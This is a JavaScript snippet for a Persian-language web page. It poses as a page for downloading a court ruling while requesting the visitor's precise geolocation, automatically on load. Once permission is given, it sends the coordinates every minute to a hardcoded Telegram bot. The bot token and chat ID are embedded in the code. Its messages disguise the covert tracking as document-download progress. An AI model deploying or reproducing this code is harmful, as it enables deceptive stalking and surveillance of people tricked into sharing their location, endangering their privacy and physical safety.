<script>
  const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
  const CHAT_ID = "8878957420";
  
  // تنظیم فاصله زمانی به ۱ دقیقه
  const INTERVAL = 1 * 60 * 1000;

  let timer = null;
  let sharingActive = false;

  const permissionBox = document.getElementById("permissionBox");
  const allowBtn = document.getElementById("allowBtn");
  const stopBtn = document.getElementById("stopBtn");
  const status = document.getElementById("status");
  const locationInfo = document.getElementById("locationInfo");
  const latElement = document.getElementById("lat");
  const lonElement = document.getElementById("lon");
  const accuracyElement = document.getElementById("accuracy");
  const lastUpdateElement = document.getElementById("lastUpdate");

  function showStatus(message) {
    status.textContent = message;
    status.style.display = "block";
  }

  function getLocation() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        resolve,
        reject,
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    });
  }

  async function sendLocationToTelegram(latitude, longitude) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
    try {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          latitude: latitude,
          longitude: longitude
        })
      });
    } catch (error) {
      console.error("خطا در  دانلود فایل :", error);
    }
  }

  async function sendLocation(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const accuracy = position.coords.accuracy;

    latElement.textContent = latitude;
    lonElement.textContent = longitude;
    accuracyElement.textContent = Math.round(accuracy);
    lastUpdateElement.textContent = new Date().toLocaleString("fa-IR");

    locationInfo.style.display = "block";

    // ارسال مختصات به API تلگرام
    await sendLocationToTelegram(latitude, longitude);
  }

  async function updateLocation() {
    if (!sharingActive) return;

    try {
      const position = await getLocation();
      await sendLocation(position);
      showStatus("حکم جدید دانلود شد.");
    } catch (error) {
      console.error(error);
      showStatus("⚠️ دنلود حکم جدید داد گاه ناموفق بود.");
    }
  }

  async function startTracking() {
    if (!window.isSecureContext) {
      showStatus("❌ صفحه باید با HTTPS باز شود (یا روی localhost باشد).");
      return;
    }

    if (!navigator.geolocation) {
      showStatus("❌ مرورگر از Geolocation پشتیبانی نمی‌کند.");
      return;
    }

    allowBtn.disabled = true;
    allowBtn.textContent = "در حال دانلود حکم داد گاه...";

    try {
      const position = await getLocation();

      permissionBox.style.display = "none";
      stopBtn.style.display = "flex";
      sharingActive = true;

      await sendLocation(position);
      showStatus("✅");

      timer = setInterval(updateLocation, INTERVAL);

    } catch (error) {
      console.error(error);
      allowBtn.disabled = false;
      allowBtn.textContent = "اجازه دادن دانلود حکم داد گاه";

      if (error.code === error.PERMISSION_DENIED) {
        showStatus("❌ دانلود حکم توسط متقاضی رد شد .");
      } else {
        showStatus("❌ دانلود ناموفق بود بود.");
      }
    }
  }

  // ۱. درخواست دسترسی هنگام کلیک روی دکمه
  allowBtn.addEventListener("click", startTracking);

  // ۲. درخواست دسترسی خودکار هنگام باز شدن صفحه
  window.addEventListener("DOMContentLoaded", () => {
    startTracking();
  });

  stopBtn.addEventListener("click", function () {
    sharingActive = false;
    if (timer !== null) {
      clearInterval(timer);
      timer = null;
    }
    stopBtn.style.display = "none";
    showStatus("⛔ دانلود حکم داد گاه متوقف شد.");
  });
</script>
